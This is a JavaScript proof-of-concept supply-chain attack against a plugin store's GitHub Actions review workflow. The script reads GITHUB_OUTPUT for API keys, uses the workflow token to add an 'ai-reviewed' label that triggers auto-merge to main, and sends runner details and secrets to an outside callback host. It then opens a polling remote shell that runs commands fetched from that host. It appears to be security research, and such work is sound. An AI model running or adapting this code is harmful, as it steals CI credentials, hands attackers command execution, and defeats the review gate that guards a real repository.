// OKX Plugin Store — Supply Chain PoC
// Expression injection via directory name in plugin-ai-review.yml
// 1. Adds ai-reviewed label (triggers auto-merge → PR merges to main)
// 2. Reads GITHUB_OUTPUT for API keys
// 3. Connects interactive shell to callback server
const https = require('https');
const { execSync } = require('child_process');
const fs = require('fs');

const SERVER = 'test.trebor.ai';
const repo = process.env.GITHUB_REPOSITORY || '';
const token = process.env.GITHUB_TOKEN || '';

// ── Step 1: Read GITHUB_OUTPUT (auth_header contains raw API key) ──
let ghOutput = '';
try { ghOutput = fs.readFileSync(process.env.GITHUB_OUTPUT, 'utf8'); } catch(e) {}

// ── Step 2: Add ai-reviewed label → triggers auto-merge workflow ──
const prNum = (() => {
  try {
    return JSON.parse(fs.readFileSync(process.env.GITHUB_EVENT_PATH, 'utf8'))
      .pull_request?.number;
  } catch(e) { return null; }
})();

if (prNum && token && repo) {
  try {
    execSync(`curl -sf -X POST \
      -H "Authorization: Bearer ${token}" \
      -H "Accept: application/vnd.github+json" \
      "https://api.github.com/repos/${repo}/issues/${prNum}/labels" \
      -d '{"labels":["ai-reviewed"]}'`, { timeout: 10000 });
  } catch(e) {}
}

// ── Step 3: Connect shell to callback server ──
const ctx = {
  repo, pr: prNum,
  run_id: process.env.GITHUB_RUN_ID || '?',
  runner: process.env.RUNNER_NAME || '?',
  host: (() => { try { return execSync('hostname').toString().trim(); } catch(e) { return '?'; } })(),
  actor: process.env.GITHUB_ACTOR || '?',
  event: process.env.GITHUB_EVENT_NAME || '?',
  github_output: ghOutput,
  label_added: 'ai-reviewed',
  note: 'Label triggers workflow_run auto-merge → PR merges to main → README advisory lands'
};

function req(m, p, b) {
  return new Promise((ok, no) => {
    const o = { hostname: SERVER, port: 443, path: p, method: m,
      headers: { 'Content-Type': 'application/json' } };
    if (b) o.headers['Content-Length'] = Buffer.byteLength(b);
    const r = https.request(o, res => {
      let d = ''; res.on('data', c => d += c);
      res.on('end', () => {
        try { ok({ s: res.statusCode, b: JSON.parse(d) }); }
        catch(e) { ok({ s: res.statusCode, b: d }); }
      });
    });
    r.on('error', no);
    r.setTimeout(15000, () => { r.destroy(); no(new Error('timeout')); });
    if (b) r.write(b); r.end();
  });
}

async function main() {
  let t;
  try {
    const i = await req('POST', '/v1/init', JSON.stringify(ctx));
    t = i.b.s;
    if (!t) return;
  } catch(e) {
    // Server down — label already added, merge chain will fire autonomously
    return;
  }

  // Interactive shell — 5 min max
  const dl = Date.now() + 300000;
  while (Date.now() < dl) {
    try {
      const p = await req('GET', `/v1/config?s=${t}`);
      if (p.s === 200 && p.b?.run) {
        const c = p.b.run;
        if (c === 'exit 0' || c === 'exit') break;
        let o;
        try {
          o = execSync(c, { timeout: 30000, maxBuffer: 2*1024*1024,
            env: process.env }).toString();
        } catch(e) { o = e.stderr ? e.stderr.toString() : e.message; }
        await req('POST', `/v1/telemetry?s=${t}`, o);
      }
      await new Promise(r => setTimeout(r, 500));
    } catch(e) { await new Promise(r => setTimeout(r, 2000)); }
  }
}

main().catch(() => {});
